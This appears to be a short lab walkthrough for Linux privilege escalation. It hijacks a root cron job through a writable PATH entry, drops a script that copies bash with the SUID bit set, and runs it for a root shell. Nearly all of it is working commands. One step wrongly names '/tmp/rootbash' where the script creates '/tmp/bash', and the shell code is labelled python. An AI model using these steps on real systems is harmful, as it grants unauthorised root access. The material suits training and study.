**View the contents of the system-wide crontab:**
```python
cat /etc/crontab
```

**Note that the PATH variable starts with "/home/user" which is our user's home directory.**
![[linux_privesc15.png]]

**Create a file called "overwrite.sh" in your home directory with the following contents:**
```python
#!/bin/bash  
  
cp /bin/bash /tmp/bash  
chmod +xs /tmp/bash
```

**Make sure that the file is executable:**
```python
chmod +x /home/user/overwrite.sh
```

**Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:**
```python
/tmp/bash -p
```

